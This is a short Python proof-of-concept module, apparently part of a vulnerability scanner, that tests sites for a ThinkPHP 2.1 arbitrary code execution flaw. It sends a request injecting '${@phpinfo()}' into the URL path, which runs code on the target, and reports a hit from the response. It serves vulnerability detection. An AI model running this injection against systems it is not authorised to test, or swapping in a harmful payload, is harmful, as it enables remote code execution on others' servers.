'''
Function:
    Thinkphp2 任意代码执行漏洞
Author:
    spmonkey,夜梓月
Email：
    spmonkey@hscsec.cn
    yeziyue@hscsec.cn
Blog:
    https://spmonkey.github.io/
    https://www.cnblogs.com/zy4024/
GitHub:
    https://github.com/spmonkey/
Ps:
    version:ThinkPHP 2.1
'''
# -*- coding: utf-8 -*-

import requests
import os
import sys
from urllib.parse import urlparse
from requests.packages.urllib3 import disable_warnings
disable_warnings()
path = os.path.dirname(os.path.dirname(os.path.abspath(__file__)))
sys.path.append(path)
from modules import get_user_agent


class poc:
    def __init__(self, url, proxies):
        self.url = url
        self.headers = {
            'User-Agent': get_user_agent.get_user_agent(),
        }
        self.result_text = ""
        self.proxies = proxies

    def host(self):
        url = urlparse(self.url)
        netloc = url.netloc
        scheme = url.scheme
        return netloc, scheme

    def vuln(self, netloc, scheme):
        url = "{}://{}/index.php?s=/index/index/name/$%7B@phpinfo()%7D".format(scheme, netloc)
        try:
            result = requests.get(url=url, headers=self.headers, verify=False, timeout=3, proxies=self.proxies)
            if "System" in result.text:
                target = urlparse(url)
                self.result_text += """\n        [+]    \033[32m检测到目标站点存在任意命令执行漏洞\033[0m
                 GET {} HTTP/1.1
                 Host: {}""".format(target.path+"?"+target.query, target.netloc)
                for request_type, request_text in dict(result.request.headers).items():
                    self.result_text += "\n                 {}: {}".format(request_type, request_text)
                return True
            else:
                return False
        except:
            return False

    def main(self):
        all = self.host()
        netloc = all[0]
        scheme = all[1]
        if self.vuln(netloc, scheme):
            return self.result_text
        else:
            return False

